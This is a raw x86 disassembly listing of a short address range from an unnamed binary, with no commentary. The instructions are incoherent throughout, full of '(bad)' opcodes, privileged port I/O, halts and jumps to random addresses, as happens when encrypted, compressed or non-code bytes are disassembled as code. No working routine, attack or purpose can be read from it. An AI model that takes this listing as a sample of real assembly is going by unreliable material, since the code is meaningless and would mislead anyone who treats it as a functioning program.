  414657:	test   DWORD PTR [eax],eax
  414659:	jb     0x4146b0
  41465b:	(bad)  
  41465c:	or     bh,cl
  41465e:	mov    dh,0xba
  414660:	add    dh,dl
  414662:	dec    esp
  414663:	xor    ah,BYTE PTR [edx]
  414665:	fcom   DWORD PTR [ebp-0x71]
  414668:	add    ecx,DWORD PTR ds:0x638422e
  41466e:	mov    esp,0x9fc2dfdb
  414673:	das    
  414674:	mov    edx,DWORD PTR ds:0xe85325f6
  41467a:	or     BYTE PTR [esp+ecx*2+0x4a],0x45
  41467f:	sbb    bl,bl
  414681:	or     al,0x31
  414683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414684:	pushf  
  414685:	or     DWORD PTR ds:0x71a1c7c7,esi
  41468b:	repnz sti 
  41468d:	mov    bh,0xb3
  41468f:	push   ss
  414690:	loope  0x414649
  414692:	test   DWORD PTR [ebp-0x5d],edi
  414695:	es push ds
  414697:	or     ah,BYTE PTR [edx-0x70def664]
  41469d:	shl    BYTE PTR [edi],0x77
  4146a0:	outs   dx,BYTE PTR ds:[esi]
  4146a1:	push   esp
  4146a2:	push   esi
  4146a3:	test   BYTE PTR [ecx+edx*8],bh
  4146a6:	xchg   esp,eax
  4146a7:	and    bh,al
  4146a9:	or     DWORD PTR [eax+0x4e0575bd],eax
  4146af:	icebp  
  4146b0:	ret    0x656a
  4146b3:	dec    edx
  4146b4:	mov    ah,0x8e
  4146b6:	jp     0x414678
  4146b8:	xchg   edx,eax
  4146b9:	dec    edx
  4146ba:	sub    al,0x1
  4146bc:	scas   al,BYTE PTR es:[edi]
  4146bd:	xchg   ebx,eax
  4146be:	mov    esi,DWORD PTR [esi-0x79]
  4146c1:	mov    ebx,0x4431cc50
  4146c6:	sti    
  4146c7:	inc    ebx
  4146c8:	test   al,0xab
  4146ca:	dec    ebp
  4146cb:	add    eax,edi
  4146cd:	popa   
  4146ce:	popa   
  4146cf:	daa    
  4146d0:	dec    ebp
  4146d1:	rcr    BYTE PTR [ecx+0x2cc5b658],1
  4146d7:	sti    
  4146d8:	or     cl,BYTE PTR [edi+ebp*8+0x513cf8f3]
  4146df:	or     ebp,DWORD PTR [edi+0x6e]
  4146e2:	out    dx,eax
  4146e3:	in     eax,0x7a
  4146e5:	cmp    al,0x29
  4146e7:	push   cs
  4146e8:	xchg   esi,eax
  4146e9:	xchg   edi,eax
  4146ea:	fisttp WORD PTR [ecx+0x57ab40]
  4146f0:	(bad)  
  4146f1:	fadd   DWORD PTR [ebx-0x66c7cdd]
  4146f7:	mov    ebx,0xcc4269e0
  4146fc:	dec    ebx
  4146fd:	lahf   
  4146fe:	inc    ebp
  4146ff:	ret    
  414700:	(bad)  
  414701:	jnp    0x4146a9
  414703:	test   al,0xc9
  414705:	jmp    0x66d7f3de
  41470a:	xchg   edi,eax
  41470b:	inc    edi
  41470c:	sti    
  41470d:	fst    QWORD PTR [ecx-0x75]
  414710:	dec    ecx
  414711:	adc    BYTE PTR [edi+0x6388b297],bl
  414717:	adc    dl,BYTE PTR [ecx]
  414719:	xor    ebx,DWORD PTR [ebx]
  41471b:	das    
  41471c:	push   esi
  41471d:	mov    ebx,fs
  41471f:	push   edi
  414720:	mov    bl,0x55
  414722:	rcr    DWORD PTR ss:[edi-0x328544ad],cl
  414729:	repnz mov edx,0x3a7e02c2
  41472f:	les    edi,FWORD PTR [ebx-0x60]
  414732:	push   ss
  414733:	sbb    ah,BYTE PTR [edx+0x956402c]
  414739:	cld    
  41473a:	ret    
  41473b:	ds ss das 
  41473e:	je     0x4146d0
  414740:	mov    ebp,0x841590d6
  414745:	pop    edi
  414746:	mov    es,WORD PTR ds:0x7df0d50f
  41474c:	push   edi
  41474d:	jno    0x4146fe
  41474f:	fcmovb st,st(4)
  414751:	icebp  
  414752:	repnz add edx,DWORD PTR [ebx+0x132ecae8]
  414759:	mov    ds:0x5ab4ce93,al
  41475e:	mov    esp,0x535c38f6
  414763:	jne    0x414711
  414765:	sub    al,0xea
  414767:	outs   dx,BYTE PTR ds:[esi]
  414768:	jns    0x4146fe
  41476a:	push   ebp
  41476b:	jbe    0x4147eb
  41476d:	mov    edi,esp
  41476f:	jmp    0x76eb0e1a
  414774:	std    
  414775:	sbb    BYTE PTR [edx],bh
  414777:	or     BYTE PTR [edx+0x4],bh
  41477a:	or     edi,edi
  41477c:	pop    ds
  41477d:	jb     0x41477f
  41477f:	repz jle 0x414730
  414782:	inc    ebx
  414783:	jb     0x4147ab
  414785:	push   eax
  414786:	pop    eax
  414787:	clc    
  414788:	xchg   ecx,eax
  414789:	and    eax,0xec1027a9
  41478e:	and    BYTE PTR [edx+0x649833ce],cl
  414794:	pop    eax
  414795:	push   edi
  414796:	xchg   ebp,eax
  414797:	dec    edi
  414798:	loop   0x414733
  41479a:	adc    eax,0x5e7bfa12
  41479f:	scas   eax,DWORD PTR es:[edi]
  4147a0:	jg     0x41481a
  4147a2:	xor    al,0x63
  4147a4:	nop
  4147a5:	jnp    0x4147ee
  4147a7:	mov    bh,0x36
  4147a9:	cmp    eax,0xf57ffb36
  4147ae:	push   es
  4147af:	xor    ebp,esp
  4147b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147b2:	mov    ebp,0xe70dd48
  4147b7:	mov    bh,0x92
  4147b9:	fld    TBYTE PTR ds:0x64ba2d3f
  4147bf:	ret    
  4147c0:	add    cl,BYTE PTR [edi+0x10740ea4]
  4147c6:	push   ebx
  4147c7:	sahf   
  4147c8:	fs pop esp
  4147ca:	mov    eax,0x707f45b1
  4147cf:	cwde   
  4147d0:	js     0x414824
  4147d2:	xchg   edi,eax
  4147d3:	(bad)  
  4147d5:	inc    ebx
  4147d6:	sub    DWORD PTR [edx],edx
  4147d8:	out    dx,al
  4147d9:	pop    esi
  4147da:	dec    esi
  4147db:	aas    
  4147dc:	pop    es
  4147dd:	mov    dl,0xba
  4147df:	aad    0x81
  4147e1:	shl    DWORD PTR [edx+0x2e],0x9e
  4147e5:	aam    0xe8
  4147e7:	sahf   
  4147e8:	lock scas al,BYTE PTR es:[edi]
  4147ea:	dec    BYTE PTR [ecx+0x12]
  4147ed:	push   esp
  4147ee:	stos   DWORD PTR es:[edi],eax
  4147ef:	jo     0x414772
  4147f1:	push   esp
  4147f2:	rcl    DWORD PTR [edi+0x32ef46a4],0xc9
  4147f9:	test   DWORD PTR [esp+ebx*2-0x37],0x30fab21c
  414801:	test   ecx,ebp
  414803:	test   BYTE PTR [ecx],cl
  414805:	arpl   WORD PTR [esi],di
  414807:	cmp    eax,0xac083766
  41480c:	dec    esi
  41480d:	aaa    
  41480e:	cmp    al,0x50
  414810:	add    eax,0x1cb24ea7
  414815:	xor    BYTE PTR [edi-0x66],0x41
  414819:	dec    esi
  41481a:	dec    ecx
  41481b:	clc    
  41481c:	pop    ebp
  41481d:	fisttp DWORD PTR [eax-0x2f]
  414820:	adc    BYTE PTR [ebx],dh
  414822:	addr16 mov eax,0x313eaaa
  414828:	mov    al,0xef
  41482a:	aad    0x87
  41482c:	xchg   esi,eax
  41482d:	scas   al,BYTE PTR es:[edi]
  41482e:	js     0x414802
  414830:	mul    DWORD PTR [ebp-0xb]
  414833:	out    0xcd,al
  414835:	xor    DWORD PTR [edi+0x7641835e],eax
  41483b:	std    
  41483c:	mov    BYTE PTR [ecx+0x28],dh
  41483f:	and    eax,DWORD PTR [edx]
  414841:	push   esi
  414842:	daa    
  414843:	pop    es
  414844:	sbb    al,0xa8
  414846:	or     ebx,DWORD PTR [esi]
  414848:	jb     0x414857
  41484a:	lock inc ebp
  41484c:	push   ebx
  41484d:	inc    esi
  41484e:	jp     0x4147d3
  414850:	adc    eax,0xa32ef242
  414855:	mov    dl,0xaf
  414857:	xlat   BYTE PTR ds:[ebx]
  414858:	mov    al,0xdb
  41485a:	jmp    0xcbe9:0xbe56
  414860:	ror    DWORD PTR [esi+ebp*2-0x4fa2f18e],1
  414867:	xchg   bx,ax
  414869:	add    eax,0xd109045f
  41486e:	rol    ebp,0xc9
  414871:	mov    edx,0x65aa7a7a
  414876:	and    esp,DWORD PTR [edi-0x1a781be7]
  41487c:	aaa    
  41487d:	mov    ebp,0xd52fa13
  414882:	out    dx,al
  414883:	mov    eax,ds:0xdb799c3a
  414888:	(bad)
  41488b:	cli    
  41488c:	pop    esp
  41488d:	jns    0x4148b8
  41488f:	mov    ds:0x49ebb7c2,eax
  414894:	aam    0x48
  414896:	out    dx,eax
  414897:	xchg   BYTE PTR [edi-0x15],ah
  41489a:	mov    ds:0x9f8ad66c,eax
  41489f:	and    ebx,esp
  4148a1:	lods   eax,DWORD PTR ds:[esi]
  4148a2:	mov    cl,0xa1
  4148a4:	mov    al,ds:0x801c0036
  4148a9:	enter  0xcddc,0x14
  4148ad:	cmp    BYTE PTR [ecx],0x27
  4148b0:	pop    ds
  4148b1:	out    dx,al
  4148b2:	fpatan 
  4148b4:	dec    eax
  4148b5:	ret    0x477
  4148b8:	(bad)  
  4148b9:	out    0xde,eax
  4148bb:	je     0x4148a1
  4148bd:	(bad)  
  4148be:	xor    DWORD PTR [ecx],edx
  4148c0:	ja     0x414914
  4148c2:	pop    edi
  4148c3:	jno    0x414875
  4148c5:	popf   
  4148c6:	call   0x3a04e73a
  4148cb:	popa   
  4148cc:	mov    ch,0x3a
  4148ce:	rcr    edx,cl
  4148d0:	add    eax,0x4ee861f5
  4148d5:	push   cs
  4148d6:	inc    ecx
  4148d7:	xchg   ebx,eax
  4148d8:	push   ebp
  4148d9:	sahf   
  4148da:	push   cs
  4148db:	fwait
  4148dc:	pop    esi
  4148dd:	pop    edi
  4148de:	mov    bh,0x74
  4148e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148e1:	cmp    al,0xa3
  4148e3:	js     0x4148a7
  4148e5:	adc    al,0xd8
  4148e7:	imul   esp,eax,0x48b9aec1
  4148ed:	sbb    bl,BYTE PTR [ebx-0x6f834bd0]
  4148f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148f4:	or     al,ah
  4148f6:	imul   edx,edx,0x3732f105
  4148fc:	mov    edi,0xeed0417
  414901:	aam    0x5b
  414903:	icebp  
  414904:	aam    0xd2
  414906:	jmp    0x4148c5
  414908:	and    ch,BYTE PTR [edx-0xb]
  41490b:	in     eax,0xb9
  41490d:	hlt    
  41490e:	repnz popa 
  414910:	(bad)  
  414911:	out    dx,al
  414912:	scas   al,BYTE PTR es:[edi]
  414913:	ret    
  414914:	jmp    0xea2f9995
  414919:	adc    eax,0x19685bf3
  41491e:	mov    bl,0x9d
  414920:	mov    ebp,0x71852da3
  414925:	popa   
  414926:	push   0x7f
  414928:	sti    
  414929:	(bad)  
  41492a:	push   ecx
  41492b:	inc    esp
  41492c:	shl    BYTE PTR [ebp-0x18],0x15
  414930:	and    al,0xd0
  414932:	scas   al,BYTE PTR es:[edi]
  414933:	mov    dh,0x69
  414935:	sub    eax,0x260810c
  41493a:	mov    ebp,0xd78fe725
  41493f:	js     0x41490e
  414941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414942:	int3   
  414943:	jmp    0x6b0e6af7
  414948:	jle    0x414978
  41494a:	out    dx,al
  41494b:	inc    edi
  41494c:	in     al,0x6e
  41494e:	inc    esi
  41494f:	hlt    
  414950:	stos   DWORD PTR es:[edi],eax
  414951:	or     DWORD PTR [esi+0x5a],ebp
  414954:	mov    eax,0xc4a6b423
  414959:	adc    eax,0x9308ba47
  41495e:	outs   dx,BYTE PTR ds:[esi]
  41495f:	push   es
  414960:	ret    0xb050
  414963:	lahf   
  414964:	daa    
  414965:	in     al,dx
  414966:	bound  esi,QWORD PTR [ecx-0x73]
  414969:	outs   dx,DWORD PTR ds:[esi]
  41496a:	xlat   BYTE PTR ds:[ebx]
  41496b:	inc    esi
  41496c:	mov    ah,0xa7
  41496e:	pop    es
  41496f:	shl    DWORD PTR [esi+ecx*8+0x2c2cce33],cl
  414976:	lods   al,BYTE PTR ds:[esi]
  414977:	jl     0x41494e
  414979:	jo     0x414919
  41497b:	aas    
  41497c:	cmp    ah,BYTE PTR [esi]
  41497e:	leave  
  41497f:	jle    0x4149c7
  414981:	inc    ebx
  414982:	jle    0x414988
  414984:	(bad)  
  414986:	inc    ebx
  414987:	mov    ch,0xd1
  414989:	and    ch,dh
  41498b:	push   edi
  41498c:	sub    bh,ch
  41498e:	loop   0x4149ff
  414990:	cmp    DWORD PTR [edx],0x50208fab
  414996:	xor    dh,BYTE PTR [ebx+0xbabda37]
  41499c:	ds pop edi
  41499e:	and    al,0xc6
  4149a0:	lahf   
  4149a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149a2:	inc    esi
  4149a3:	mov    ah,0x5d
  4149a5:	sbb    BYTE PTR [edx],bl
  4149a7:	dec    ebp
  4149a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149a9:	in     eax,dx
  4149aa:	les    ecx,FWORD PTR [edi+eiz*4]
  4149ad:	mov    dl,0x16
  4149af:	push   ss
  4149b0:	pop    ebx
  4149b1:	test   DWORD PTR [edi+ebp*2],ebx
  4149b4:	cwde   
  4149b5:	xor    eax,0x579e0c18
  4149ba:	into   
  4149bb:	sub    DWORD PTR [ebx+0x1c],ebp
  4149be:	dec    edi
  4149bf:	in     al,dx
  4149c0:	mov    BYTE PTR [esi+0x2fb4325a],bh
  4149c6:	neg    esp
  4149c8:	dec    esp
  4149c9:	mov    BYTE PTR [ecx+0x2],dh
  4149cc:	(bad)  [edi-0x2eac3de3]
  4149d2:	sbb    eax,0x8e1ce9cf
  4149d7:	and    eax,DWORD PTR cs:[edi+0x7c]
  4149db:	inc    eax
  4149dc:	adc    DWORD PTR [ecx+edi*4],ebx
  4149df:	sbb    bl,BYTE PTR [esi]
  4149e1:	call   0x40c1fee
  4149e6:	xchg   edx,eax
  4149e7:	xor    DWORD PTR [ebp-0x2d],esp
  4149ea:	and    BYTE PTR [eax-0x2f],al
  4149ed:	pop    es
  4149ee:	fisub  WORD PTR [eax+0x4]
  4149f1:	inc    edx
  4149f2:	aad    0x89
  4149f4:	adc    edx,DWORD PTR [eax]
  4149f6:	test   DWORD PTR [ebx+0x7d],0xce16e71c
  4149fd:	out    0x81,eax
  4149ff:	dec    esp
  414a00:	mov    al,0xf4
  414a02:	mov    dl,0xa4
  414a04:	mov    ch,0x2b
  414a06:	outs   dx,DWORD PTR ds:[esi]
  414a07:	pop    edi
  414a08:	push   esi
  414a09:	mov    es,WORD PTR [ebp-0x3f609c79]
  414a0f:	xchg   esp,eax
  414a10:	(bad)  
  414a11:	and    al,0x2d
  414a13:	cmc    
  414a14:	xchg   ebx,eax
  414a15:	sbb    cl,dl
  414a17:	in     al,0x1a
  414a19:	sbb    BYTE PTR [edi-0x2a6ec667],dl
  414a1f:	push   esi
  414a20:	cmp    WORD PTR ds:0xde2359c5,0x69a4
  414a29:	push   eax
  414a2a:	(bad)  
  414a2b:	popa   
  414a2c:	adc    DWORD PTR [edx-0x72],ebx
  414a2f:	and    DWORD PTR [edx-0x75917633],ebp
  414a35:	xchg   esi,eax
  414a36:	cmp    eax,esp
  414a38:	jb     0x4149d9
  414a3a:	fimul  WORD PTR [ebx-0x76]
  414a3d:	pop    eax
  414a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a3f:	add    al,0x4
  414a41:	dec    esi
  414a42:	jae    0x414a19
  414a44:	adc    al,0xf1
  414a46:	dec    edi
  414a47:	sbb    eax,0x4e05cce8
  414a4c:	fistp  WORD PTR [eax]
  414a4e:	cmp    al,0xff
  414a50:	out    dx,eax
  414a51:	outs   dx,DWORD PTR ds:[esi]
  414a52:	(bad)  
  414a53:	in     eax,dx
  414a54:	out    dx,al
  414a55:	dec    edi
  414a56:	test   BYTE PTR [ebp-0x23],ch
  414a59:	mov    al,0x3a
  414a5b:	pop    esi
  414a5c:	sbb    edi,DWORD PTR [eax+ebp*2-0xadf254d]
  414a63:	mov    bh,0xaf
  414a65:	ret    
  414a66:	jl     0x414a38
  414a68:	mov    DWORD PTR [ebx-0x2b48da92],edx
  414a6e:	or     DWORD PTR [ebp-0x3f],esi
  414a71:	ds ret 0x91b8
  414a75:	cmp    BYTE PTR [esi-0x7e49bc14],bl
  414a7b:	cmp    al,0xd0
  414a7d:	mov    ecx,0x92b38560
  414a82:	(bad)  
  414a83:	std    
  414a84:	mov    eax,0x49db2ba8
  414a89:	aam    0x82
  414a8b:	dec    edi
  414a8c:	inc    ebp
  414a8d:	aam    0x48
  414a8f:	icebp  
  414a90:	jmp    0xf9d5:0x4f76bf28
  414a97:	xor    dl,BYTE PTR [edi+0x3911e35c]
  414a9d:	xchg   cl,ah
  414a9f:	sub    ch,al
  414aa1:	mov    edx,0x4317b3a8
  414aa6:	dec    BYTE PTR [ebx+0x3e]
  414aa9:	daa    
  414aaa:	loopne 0x414aee
  414aac:	push   ds
  414aad:	push   esi
  414aae:	cli    
  414aaf:	daa    
  414ab0:	jle    0x414af7
  414ab2:	mov    eax,0x1ce84cab
  414ab7:	enter  0xb61f,0x23
  414abb:	icebp  
  414abc:	mov    ch,BYTE PTR ds:0xa7997956
  414ac2:	jmp    0x414aaf
  414ac4:	add    ecx,ecx
  414ac6:	test   al,0x71
  414ac8:	js     0x414a54
  414aca:	or     BYTE PTR [edx-0x8],al
  414acd:	adc    DWORD PTR ds:0x57188e12,ebx
  414ad3:	or     eax,0x359c0657
  414ad8:	mov    ds:0xc51b628f,al
  414add:	mov    ebx,0xdae41f2
  414ae2:	pop    ecx
  414ae3:	sahf   
  414ae4:	test   DWORD PTR [eax+0x5c0a8103],ebx
  414aea:	xchg   ebx,eax
  414aeb:	and    DWORD PTR [ecx+edx*1],edx
  414aee:	jle    0x414a8a
  414af0:	icebp  
  414af1:	aam    0x5a
  414af3:	push   edi
  414af4:	adc    bh,BYTE PTR [esi]
  414af6:	sub    eax,ecx
  414af8:	dec    esi
  414af9:	ficom  DWORD PTR [ebx]
  414afb:	xlat   BYTE PTR gs:[ebx]
  414afd:	cmp    DWORD PTR [edx+ecx*4-0x40],esi
  414b01:	lahf   
  414b02:	mov    cl,0x94
  414b04:	pop    eax
  414b05:	xor    ch,BYTE PTR [eax]
  414b07:	adc    bl,BYTE PTR [esi+0x14]
  414b0a:	xchg   ecx,eax
  414b0b:	call   0x199b6f01
  414b10:	sub    al,0xc1
  414b12:	or     DWORD PTR [eax+0x3ac0dd0e],ebx
  414b18:	inc    edi
  414b19:	pop    DWORD PTR [eax+0x2e1e3a39]
  414b1f:	inc    ecx
  414b20:	mov    cl,0xc5
  414b22:	pop    edi
  414b23:	xor    DWORD PTR [ebx+0x641599f2],edi
  414b29:	dec    esi
  414b2a:	in     eax,dx
  414b2b:	adc    DWORD PTR [ebp-0x3d644710],0xa2c2ed8
  414b35:	mov    BYTE PTR [ebp+0x68],dh
  414b38:	loope  0x414abc
  414b3a:	mov    ebp,0x6334a040
  414b3f:	aas    
  414b40:	popa   
  414b41:	hlt    
  414b42:	add    DWORD PTR [edx+esi*2-0x7e],ebx
  414b46:	out    0x57,al
  414b48:	inc    edx
  414b49:	mov    dl,0xb4
  414b4b:	clc    
  414b4c:	adc    al,0xf4
  414b4e:	cmp    al,0x9
  414b50:	xor    esi,esp
  414b52:	sbb    esi,esi
  414b54:	stc    
  414b55:	aaa    
  414b56:	adc    al,0x49
  414b58:	pusha  
  414b59:	mov    esi,esi
  414b5b:	sub    cl,BYTE PTR [ebp-0x10e212d0]
  414b61:	dec    esi
  414b62:	dec    ebp
  414b63:	xchg   ebp,eax
  414b64:	sahf   
  414b65:	mov    al,BYTE PTR ds:0x4096a42f
  414b6b:	jmp    DWORD PTR [ebp-0x3a]
  414b6e:	cmp    DWORD PTR [ebp-0x5f],ebx
  414b71:	dec    esp
  414b72:	js     0x414b04
  414b74:	and    esp,DWORD PTR [ebp+0x76]
  414b77:	push   es
  414b78:	and    al,0x41
  414b7a:	sub    ebx,DWORD PTR [edi+0x4f]
  414b7d:	jg     0x414bc2
  414b7f:	ins    DWORD PTR es:[edi],dx
  414b80:	jns    0x414b32
  414b82:	bound  esp,QWORD PTR [ebx-0x4b2957c1]
  414b88:	call   0xd8fd:0xaab3532d
  414b8f:	xchg   edi,eax
  414b90:	push   edi
  414b91:	sub    BYTE PTR [eax-0x1e],bh
  414b94:	add    BYTE PTR [esi],dl
  414b96:	mov    ecx,0xb028637a
  414b9b:	arpl   WORD PTR [edi],ax
  414b9d:	and    al,0x72
  414b9f:	jo     0x414b63
  414ba1:	inc    edx
  414ba2:	out    dx,eax
  414ba3:	mov    al,0x82
  414ba5:	rcr    BYTE PTR [edx-0x17ee18a2],cl
  414bab:	ror    BYTE PTR [esi+0x14],cl
  414bae:	repz or DWORD PTR es:[esi+0x5d],edx
  414bb3:	mov    ebx,DWORD PTR [ebx+0x58]
  414bb6:	daa    
  414bb7:	xlat   BYTE PTR ds:[ebx]
  414bb8:	std    
  414bb9:	jo     0x414b94
  414bbb:	retf   0x19eb
  414bbe:	mov    ch,0x92
  414bc0:	push   0xffffffa3
  414bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc3:	(bad)  
  414bc4:	adc    bh,BYTE PTR [ebp+0x9]
  414bc7:	adc    eax,0xfdc63424
  414bcc:	mov    ds:0x3daa1e0e,al
  414bd1:	and    eax,0x5639146c
  414bd6:	in     eax,dx
  414bd7:	fnstsw WORD PTR [ecx-0x501b6318]
  414bdd:	jle    0x414bb0
  414bdf:	sbb    al,0x9b
  414be1:	add    bl,al
  414be3:	jns    0x414c35
  414be5:	cmp    ebp,DWORD PTR [eax+0x26]
  414be8:	fidiv  WORD PTR [ecx-0x23]
  414beb:	mul    BYTE PTR [ebp-0x3b]
  414bee:	ret    
  414bef:	inc    edi
  414bf0:	packsswb mm5,QWORD PTR ds:0x7d117d27
  414bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bf8:	rol    BYTE PTR [eax+0x28e27c24],cl
  414bfe:	repz test eax,0xe13f8de5
  414c04:	sub    DWORD PTR [edi-0x37],eax
  414c07:	xor    al,0x50
  414c09:	add    al,0xdb
  414c0b:	adc    BYTE PTR [ecx-0x4a02eae9],0x6a
  414c12:	ds adc eax,0xd954f949
  414c18:	int3   
  414c19:	aaa    
  414c1a:	cdq    
  414c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c1c:	adc    esp,DWORD PTR [edx]
  414c1e:	(bad)  
  414c1f:	into   
  414c20:	and    eax,0xd0fa82e3
  414c25:	or     eax,0xf2a77e1e
  414c2a:	sub    ah,bh
  414c2c:	cmc    
  414c2d:	fild   WORD PTR [ecx+0x746927b3]
  414c33:	outs   dx,BYTE PTR ds:[esi]
  414c34:	shl    eax,cl
  414c36:	mov    al,0x4e
  414c38:	sti    
  414c39:	push   esp
  414c3a:	sub    bl,BYTE PTR [ecx-0x2b363fe9]
  414c40:	pushf  
  414c41:	xor    eax,0xd2b1a96b
  414c46:	jne    0x414ca1
  414c48:	jg     0x414bf1
  414c4a:	xchg   BYTE PTR [edi+0x457e2547],ah
  414c50:	fs inc edi
  414c52:	jo     0x414cb3
  414c54:	pusha  
  414c55:	pop    edi
  414c56:	sbb    esp,DWORD PTR ds:0x840a6c2a
  414c5c:	jo     0x414c0c
  414c5e:	push   cs
  414c5f:	popf   
  414c60:	scas   eax,DWORD PTR es:[edi]
  414c61:	dec    esp
  414c62:	(bad)  
  414c63:	mov    ecx,0x1eb6b3fe
  414c68:	mov    esp,0x1149188b
  414c6d:	js     0x414c72
  414c6f:	push   eax
  414c70:	push   esi
  414c71:	gs jecxz 0x414cac
  414c74:	rcl    BYTE PTR [eax],1
  414c76:	mov    esp,0xadd9bb59
  414c7b:	or     al,0x25
  414c7d:	cmp    al,0x60
  414c7f:	or     BYTE PTR [edx],dh
  414c81:	xchg   edi,eax
  414c82:	leave  
  414c83:	mov    bl,0xad
  414c85:	push   ecx
  414c86:	xchg   BYTE PTR [edi],ch
  414c88:	lds    ebp,FWORD PTR [ecx+eiz*2]
  414c8b:	fld    DWORD PTR [esi+ecx*1]
  414c8e:	add    al,BYTE PTR [esi]
  414c90:	daa    
  414c91:	push   ds
  414c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c93:	inc    edx
  414c94:	int    0x4
  414c96:	scas   eax,DWORD PTR es:[edi]
  414c97:	call   0x5608e8f3
  414c9c:	pusha  
  414c9d:	ret    0x4634
  414ca0:	shl    edx,1
  414ca2:	mov    esi,0x1b5779a0
  414ca7:	mov    eax,ds:0x30191ab9
  414cac:	fcomp  DWORD PTR [ebp-0x73]
  414caf:	call   edx
  414cb1:	outs   dx,DWORD PTR ds:[esi]
  414cb2:	push   esp
  414cb3:	fist   WORD PTR [eax+0x7e631970]
  414cb9:	xchg   esp,eax
  414cba:	sar    DWORD PTR [edx*1-0x639b6dd],cl
  414cc1:	into   
  414cc2:	pop    esi
  414cc3:	push   ds
  414cc4:	dec    eax
  414cc5:	adc    DWORD PTR [edi+0x75],ebx
  414cc8:	clc    
  414cc9:	div    DWORD PTR [ecx+0x22]
  414ccc:	cld    
  414ccd:	lock mov al,ds:0x9d451bed
  414cd3:	push   eax
  414cd4:	hlt    
  414cd5:	mov    esp,0x5a0c4e02
  414cda:	popf   
  414cdb:	xor    BYTE PTR [ecx+0x9fde983],dh
  414ce1:	or     edi,DWORD PTR [ebp+eiz*8-0x75]
  414ce5:	lds    esp,FWORD PTR [edx]
  414ce7:	inc    esi
  414ce8:	inc    edx
  414ce9:	inc    ebx
  414cea:	inc    ecx
  414ceb:	dec    ebp
  414cec:	adc    DWORD PTR [edi],eax
  414cee:	jno    0x414cbd
  414cf0:	(bad)  
  414cf2:	sub    dl,BYTE PTR [esi-0x45]
  414cf5:	fsubr  st(5),st
  414cf7:	dec    eax
  414cf8:	mov    dl,0x21
  414cfa:	adc    al,0xde
  414cfc:	stos   DWORD PTR es:[edi],eax
  414cfd:	xor    BYTE PTR [ebp+0xa],ah
  414d00:	aad    0x7d
  414d02:	das    
  414d03:	mov    ch,0xe9
  414d05:	test   cl,0xed
  414d08:	out    0xc8,al
  414d0a:	mov    edx,ss
  414d0c:	ret    0xb0fb
  414d0f:	mov    bl,0x73
  414d11:	push   edi
  414d12:	jmp    DWORD PTR [ebp-0x24]
  414d15:	xlat   BYTE PTR ds:[ebx]
  414d16:	call   0x5034d83c
  414d1b:	pop    ebx
  414d1c:	jl     0x414d57
  414d1e:	sar    BYTE PTR [ebx+0x6e],1
  414d21:	aaa    
  414d22:	adc    dl,bh
  414d24:	loope  0x414cbf
  414d26:	stc    
  414d27:	xchg   edx,eax
  414d28:	add    DWORD PTR [ebp+0x5f1516eb],0x9870dff1
  414d32:	xchg   ebp,eax
  414d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d34:	inc    eax
  414d35:	xchg   esp,eax
  414d36:	das    
  414d37:	xchg   edx,eax
  414d38:	mov    esp,0x9176165f
  414d3d:	or     BYTE PTR [esi-0x2a],bh
  414d40:	scas   al,BYTE PTR es:[edi]
  414d41:	inc    edx
  414d42:	and    DWORD PTR [ebp-0x67fc290e],eax
  414d48:	cld    
  414d49:	push   ecx
  414d4a:	jg     0x414d77
  414d4c:	adc    eax,0xa557e540
  414d51:	adc    al,0x34
  414d53:	sub    eax,0x859bc069
  414d58:	ds or  al,0xa8
  414d5b:	mov    WORD PTR [ebp-0x4d96c3c3],es
  414d61:	ss call 0x2c439db8
  414d67:	push   es
  414d68:	daa    
  414d69:	dec    ebx
  414d6a:	inc    eax
  414d6b:	pop    edi
  414d6c:	and    BYTE PTR [ecx+0x452365c7],cl
  414d72:	adc    esi,DWORD PTR [edx-0x352c8788]
  414d78:	mov    bl,dh
  414d7a:	test   BYTE PTR ds:0xbeb3c466,bh
  414d80:	push   0x4a
  414d82:	cdq    
  414d83:	add    eax,0xb9715358
  414d88:	xchg   bh,bh
  414d8a:	lahf   
  414d8b:	jno    0x414d3c
  414d8d:	push   eax
  414d8e:	pushf  
  414d8f:	xor    esi,esp
  414d91:	ffreep st(6)
  414d93:	stos   BYTE PTR es:[edi],al
  414d94:	lds    edx,FWORD PTR [edx]
  414d96:	or     al,0x15
  414d98:	fcom   QWORD PTR [ecx]
  414d9a:	jecxz  0x414d6f
  414d9c:	pop    ecx
  414d9d:	es push esi
  414d9f:	mov    dh,0xc6
  414da1:	mov    al,ds:0x9160aebb
  414da6:	out    dx,eax
  414da7:	adc    eax,0x6dbefc67
  414dac:	test   eax,0x1d3461fc
  414db1:	sub    al,0x3f
  414db3:	mov    ah,0x12
  414db5:	enter  0x836c,0x99
  414db9:	inc    esi
  414dba:	mov    edx,0x2a1862d7
  414dbf:	or     ecx,DWORD PTR [eax+0x5c]
  414dc2:	inc    esp
  414dc3:	push   DWORD PTR [ebx+0x1ce8a169]
  414dc9:	(bad)  
  414dcb:	cmp    ebp,0xffffffd4
  414dce:	adc    eax,DWORD PTR [eax-0x153d3b8d]
  414dd4:	pop    ebx
  414dd5:	sbb    ch,BYTE PTR [esp+esi*4]
  414dd8:	fnstcw WORD PTR [edx+0x6a]
  414ddb:	and    BYTE PTR [ebx+0x2d7ba121],bl
  414de1:	dec    esp
  414de2:	mov    ebp,0xe6bcba0c
  414de7:	lahf   
  414de8:	xchg   DWORD PTR [ebp-0xa],esi
  414deb:	mov    ch,0xba
  414ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dee:	and    DWORD PTR [ebp+edx*8-0x4fb13c29],edi
  414df5:	in     al,0xf6
  414df7:	xor    BYTE PTR [edi-0x7a],bh
  414dfa:	lock fnstenv [ebp-0x44]
